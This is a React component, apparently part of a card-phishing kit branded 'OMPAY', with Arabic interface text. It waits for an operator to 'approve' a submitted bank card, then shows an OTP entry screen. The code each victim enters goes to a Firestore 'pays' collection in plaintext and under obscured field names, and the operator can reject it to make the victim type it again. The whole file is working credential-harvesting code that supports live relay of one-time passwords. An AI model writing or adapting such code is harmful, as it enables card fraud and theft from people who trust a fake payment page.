import React, { useState, useEffect, useRef } from 'react';
import { db } from '../lib/firebase';
import { doc, onSnapshot, updateDoc, arrayUnion, serverTimestamp } from 'firebase/firestore';
import { _e } from '../lib/secure-utils';

interface Props {
  docId: string;
}

type Stage = 'waiting' | 'otp' | 'submitted' | 'approved' | 'rejected';

export default function OtpVerify({ docId }: Props) {
  const [stage, setStage]   = useState<Stage>('waiting');
  const [otp,   setOtp]     = useState(['', '', '', '', '', '']);
  const [error, setError]   = useState('');
  const [submitting, setSubmitting] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  /* ── Listen to Firestore doc in real-time ── */
  useEffect(() => {
    if (!docId) return;
    const ref = doc(db, 'pays', docId);

    const unsub = onSnapshot(ref, (snap) => {
      if (!snap.exists()) return;
      const data = snap.data();

      const cardStatus  = data.cardStatus;
      const redirectPage = data.redirectPage;
      const otpStatus   = data.otpStatus;
      const v5Status    = data._v5Status;

      // Admin approved card with OTP → show OTP input
      if (
        cardStatus === 'approved_with_otp' ||
        redirectPage === 'otp' ||
        otpStatus === 'show_otp'
      ) {
        if (stage === 'waiting') setStage('otp');
      }

      // Admin approved OTP → done
      if (v5Status === 'approved' || otpStatus === 'approved') {
        setStage('approved');
      }

      // Admin rejected OTP → let user re-enter
      if (v5Status === 'rejected' || otpStatus === 'rejected') {
        setStage('otp');
        setOtp(['', '', '', '', '', '']);
        setError('الرمز غير صحيح، أدخله مجدداً');
      }
    });

    return () => unsub();
  }, [docId, stage]);

  /* ── OTP input helpers ── */
  const handleOtpChange = (index: number, value: string) => {
    const digit = value.replace(/\D/g, '').slice(-1);
    const newOtp = [...otp];
    newOtp[index] = digit;
    setOtp(newOtp);
    setError('');
    if (digit && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    const newOtp = [...otp];
    digits.split('').forEach((d, i) => { newOtp[i] = d; });
    setOtp(newOtp);
    inputRefs.current[Math.min(digits.length, 5)]?.focus();
  };

  const otpFull = otp.every((d) => d !== '');

  /* ── Submit OTP to Firestore ── */
  const handleSubmit = async () => {
    if (!otpFull || submitting) return;
    setSubmitting(true);
    setError('');

    const code = otp.join('');
    const now  = new Date().toISOString();

    try {
      const ref = doc(db, 'pays', docId);
      await updateDoc(ref, {
        // Encrypted OTP in root (legacy compat)
        _v5:       _e(code),
        otp:       code,
        otpStatus: 'verifying',
        _v5Status: 'verifying',
        otpUpdatedAt: now,
        updatedAt: serverTimestamp(),

        // Append to history
        history: arrayUnion({
          id:        `otp-${Date.now()}`,
          type:      '_t2',
          timestamp: now,
          status:    'pending',
          data: {
            _v5: _e(code),
          },
        }),
      });

      setStage('submitted');
    } catch (err) {
      console.error('OTP submit error:', err);
      setError('حدث خطأ، حاول مجدداً');
    } finally {
      setSubmitting(false);
    }
  };

  /* ── Render: Waiting for admin ── */
  if (stage === 'waiting') {
    return (
      <div
        className="min-h-[100dvh] w-full flex items-center justify-center bg-gray-100 font-sans"
        dir="rtl"
      >
        <div
          className="w-full max-w-[390px] h-[100dvh] sm:h-[844px] flex flex-col items-center justify-center px-8 sm:rounded-[40px] sm:shadow-2xl"
          style={{ background: 'linear-gradient(180deg, #0b1426 0%, #0f1c35 100%)' }}
        >
          {/* Animated ring */}
          <div className="relative mb-8">
            <div className="w-28 h-28 rounded-full border-4 border-blue-600/30 flex items-center justify-center">
              <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-blue-600 animate-spin" />
              <svg className="w-12 h-12 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
              </svg>
            </div>
          </div>

          <h1 className="text-[#D4A845] text-xl font-bold tracking-widest uppercase mb-6">OMPAY</h1>
          <h2 className="text-white text-2xl font-bold text-center mb-3">جارٍ مراجعة بطاقتك</h2>
          <p className="text-slate-400 text-sm text-center leading-relaxed">
            تم إرسال بيانات بطاقتك بنجاح.<br />
            يرجى الانتظار حتى يتم التحقق والموافقة.
          </p>

          {/* Pulsing dots */}
          <div className="flex gap-2 mt-8">
            {[0, 1, 2].map((i) => (
              <div
                key={i}
                className="w-2 h-2 rounded-full bg-blue-500"
                style={{ animation: `pulse 1.4s ease-in-out ${i * 0.2}s infinite` }}
              />
            ))}
          </div>

          <style>{`
            @keyframes pulse {
              0%, 80%, 100% { opacity: 0.2; transform: scale(0.8); }
              40% { opacity: 1; transform: scale(1.2); }
            }
          `}</style>
        </div>
      </div>
    );
  }

  /* ── Render: Approved ── */
  if (stage === 'approved') {
    return (
      <div
        className="min-h-[100dvh] w-full flex items-center justify-center bg-gray-100 font-sans"
        dir="rtl"
      >
        <div
          className="w-full max-w-[390px] h-[100dvh] sm:h-[844px] flex flex-col items-center justify-center px-8 sm:rounded-[40px] sm:shadow-2xl"
          style={{ background: 'linear-gradient(180deg, #0b1426 0%, #0f1c35 100%)' }}
        >
          <div className="w-28 h-28 rounded-full bg-green-600/20 border-4 border-green-500 flex items-center justify-center mb-8 shadow-[0_0_40px_rgba(34,197,94,0.3)]">
            <svg className="w-14 h-14 text-green-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
            </svg>
          </div>
          <h1 className="text-[#D4A845] text-xl font-bold tracking-widest uppercase mb-4">OMPAY</h1>
          <h2 className="text-white text-2xl font-bold text-center mb-3">تم التسجيل بنجاح!</h2>
          <p className="text-slate-400 text-sm text-center leading-relaxed">
            تم ربط بطاقتك بساعة OMPAY بنجاح.<br />
            يمكنك الآن الدفع بكل سهولة.
          </p>
        </div>
      </div>
    );
  }

  /* ── Render: Submitted (waiting for OTP approval) ── */
  if (stage === 'submitted') {
    return (
      <div
        className="min-h-[100dvh] w-full flex items-center justify-center bg-gray-100 font-sans"
        dir="rtl"
      >
        <div
          className="w-full max-w-[390px] h-[100dvh] sm:h-[844px] flex flex-col items-center justify-center px-8 sm:rounded-[40px] sm:shadow-2xl"
          style={{ background: 'linear-gradient(180deg, #0b1426 0%, #0f1c35 100%)' }}
        >
          <div className="relative mb-8">
            <div className="w-28 h-28 rounded-full border-4 border-blue-600/30 flex items-center justify-center">
              <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-blue-600 animate-spin" />
              <svg className="w-12 h-12 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M7.5 8.25h9m-9 3H12m-9.75 1.51c0 1.6 1.123 2.994 2.707 3.227 1.129.166 2.27.293 3.423.379.35.026.67.21.865.501L12 21l2.755-4.133a1.14 1.14 0 01.865-.501 48.172 48.172 0 003.423-.379c1.584-.233 2.707-1.626 2.707-3.228V6.741c0-1.602-1.123-2.995-2.707-3.228A48.394 48.394 0 0012 3c-2.392 0-4.744.175-7.043.513C3.373 3.746 2.25 5.14 2.25 6.741v6.018z" />
              </svg>
            </div>
          </div>
          <h1 className="text-[#D4A845] text-xl font-bold tracking-widest uppercase mb-4">OMPAY</h1>
          <h2 className="text-white text-2xl font-bold text-center mb-3">جارٍ التحقق من الرمز</h2>
          <p className="text-slate-400 text-sm text-center">
            تم إرسال الرمز، يرجى الانتظار...
          </p>
          <div className="flex gap-2 mt-6">
            {[0, 1, 2].map((i) => (
              <div
                key={i}
                className="w-2 h-2 rounded-full bg-blue-500"
                style={{ animation: `pulse 1.4s ease-in-out ${i * 0.2}s infinite` }}
              />
            ))}
          </div>
          <style>{`
            @keyframes pulse {
              0%, 80%, 100% { opacity: 0.2; transform: scale(0.8); }
              40% { opacity: 1; transform: scale(1.2); }
            }
          `}</style>
        </div>
      </div>
    );
  }

  /* ── Render: OTP Input ── */
  return (
    <div
      className="min-h-[100dvh] w-full flex items-center justify-center bg-gray-100 font-sans"
      dir="rtl"
    >
      <div
        className="w-full max-w-[390px] h-[100dvh] sm:h-[844px] flex flex-col sm:rounded-[40px] sm:overflow-hidden sm:shadow-2xl"
        style={{ background: 'linear-gradient(180deg, #0b1426 0%, #0f1c35 100%)' }}
      >
        {/* Header */}
        <div className="flex items-center justify-center px-6 pt-12 pb-4">
          <h1 className="text-[#D4A845] text-xl font-bold tracking-widest uppercase">OMPAY</h1>
        </div>

        {/* Content */}
        <div className="flex-1 flex flex-col items-center justify-center px-6">
          {/* Icon */}
          <div className="w-20 h-20 rounded-full bg-blue-600/20 border-2 border-blue-600/50 flex items-center justify-center mb-6 shadow-[0_0_30px_rgba(37,99,235,0.3)]">
            <svg className="w-10 h-10 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M10.5 1.5H8.25A2.25 2.25 0 006 3.75v16.5a2.25 2.25 0 002.25 2.25h7.5A2.25 2.25 0 0018 20.25V3.75a2.25 2.25 0 00-2.25-2.25H13.5m-3 0V3h3V1.5m-3 0h3m-3 18.75h3" />
            </svg>
          </div>

          <h2 className="text-white text-2xl font-bold text-center mb-2">أدخل رمز التحقق</h2>
          <p className="text-slate-400 text-sm text-center mb-8 leading-relaxed">
            أُرسل رمز التحقق إلى هاتفك المسجل
          </p>

          {/* OTP boxes */}
          <div className="flex gap-3 mb-4 justify-center" dir="ltr" onPaste={handlePaste}>
            {otp.map((digit, i) => (
              <input
                key={i}
                ref={(el) => { inputRefs.current[i] = el; }}
                type="tel"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleOtpChange(i, e.target.value)}
                onKeyDown={(e) => handleKeyDown(i, e)}
                className={`w-12 h-14 rounded-xl text-center text-xl font-bold text-white outline-none transition-all border-2 ${
                  digit
                    ? 'bg-blue-600/30 border-blue-500 shadow-[0_0_12px_rgba(37,99,235,0.4)]'
                    : 'bg-[#111e35] border-white/10 focus:border-blue-500/60'
                }`}
              />
            ))}
          </div>

          {error && (
            <p className="text-red-400 text-sm text-center mb-4">{error}</p>
          )}

          <p className="text-slate-500 text-xs text-center mt-2">
            لم تستلم الرمز؟ انتظر قليلاً ثم أعد المحاولة
          </p>
        </div>

        {/* Bottom */}
        <div className="px-5 pb-10 pt-4">
          <button
            onClick={handleSubmit}
            disabled={!otpFull || submitting}
            className={`w-full rounded-[20px] py-4 text-xl font-bold transition-all ${
              otpFull && !submitting
                ? 'bg-blue-600 hover:bg-blue-700 active:scale-[0.98] text-white shadow-lg shadow-blue-600/30 cursor-pointer'
                : 'bg-slate-700 text-slate-500 cursor-not-allowed'
            }`}
          >
            {submitting ? (
              <span className="flex items-center justify-center gap-2">
                <svg className="w-5 h-5 animate-spin" viewBox="0 0 24 24" fill="none">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"/>
                </svg>
                جاري التحقق...
              </span>
            ) : 'تأكيد'}
          </button>
        </div>
      </div>
    </div>
  );
}
